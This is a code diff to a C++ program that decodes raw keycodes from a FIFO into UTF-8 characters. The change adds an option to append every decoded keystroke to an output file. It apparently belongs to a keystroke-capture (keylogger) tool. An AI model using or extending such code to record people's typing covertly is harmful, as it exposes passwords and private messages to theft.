@@ -93,6 +93,7 @@ int main(int argc, char* argv[]) {
 
     std::string fifo_name = argv[1];
     std::string layout = argv[2];
+    std::string out_name = argv[3];
 
     std::filesystem::create_directories("fifo");
     if (!std::filesystem::exists(fifo_name)) {
@@ -114,6 +115,15 @@ int main(int argc, char* argv[]) {
     if (!state) {
         std::cerr << RED << "Error creating the keyboard state" << RESET << std::endl;
         return -1;
+    }
+
+    int out_fd = -1;
+    if (!out_name.empty()) {
+        out_fd = open(out_name.c_str(), O_WRONLY | O_CREAT | O_APPEND, 0666);
+        if (out_fd < 0) {
+            std::cerr << RED << "Error opening output file: " << strerror(errno) << RESET << std::endl;
+            return -1;
+        }
     }
 
     std::cout << GREEN << "[+] Connected to the output FIFO" << RESET << "\n";
@@ -142,6 +152,15 @@ int main(int argc, char* argv[]) {
                     xkb_keycode_t xkb_keycode = static_cast<xkb_keycode_t>(raw_code + 8);
                     const char* utf8_key = keycode_to_utf8(state, xkb_keycode);
                     printf("%s", utf8_key);
+
+                    if (out_fd >= 0) {
+                        if (strncmp(utf8_key, key_names.at(XKB_KEY_Return), strlen(key_names.at(XKB_KEY_Return))) == 0) {
+                            write(out_fd, "\n", 1);
+                        } else {
+                            write(out_fd, utf8_key, strlen(utf8_key));
+                        }
+                    }
+
                 } else {
                     buffer[bytes_read] = '\0';
                     std::string line(buffer);
